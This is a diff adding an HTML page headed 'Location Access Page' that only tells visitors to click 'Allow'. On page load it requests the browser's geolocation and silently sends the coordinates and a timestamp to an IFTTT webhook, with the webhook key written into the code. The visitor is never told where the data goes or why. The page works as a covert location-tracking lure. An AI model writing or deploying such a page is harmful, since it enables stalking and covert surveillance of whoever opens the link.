@@ -1,0 +1,48 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Get Location</title>
+</head>
+<body>
+    <h1>Location Access Page</h1>
+    <p>Click "Allow" to proceed.</p>
+    <script>
+        function sendLocation(latitude, longitude) {
+            const webhookURL = "https://maker.ifttt.com/trigger/Location_update/with/key/ddLkMioRn0CIWb9G_YlQFE";
+            const data = {
+                value1: latitude,
+                value2: longitude,
+                value3: new Date().toISOString()
+            };
+
+            fetch(webhookURL, {
+                method: "POST",
+                headers: {
+                    "Content-Type": "application/json"
+                },
+                body: JSON.stringify(data)
+            })
+            .then(response => console.log("Location sent successfully!"))
+            .catch(error => console.error("Error sending location:", error));
+        }
+
+        function getLocation() {
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(
+                    (position) => {
+                        const latitude = position.coords.latitude;
+                        const longitude = position.coords.longitude;
+                        sendLocation(latitude, longitude);
+                    },
+                    (error) => console.error("Error getting location:", error)
+                );
+            } else {
+                console.error("Geolocation is not supported by this browser.");
+            }
+        }
+
+        // Automatically get location on page load
+        getLocation();
+    </script>
+</body>
+</html>
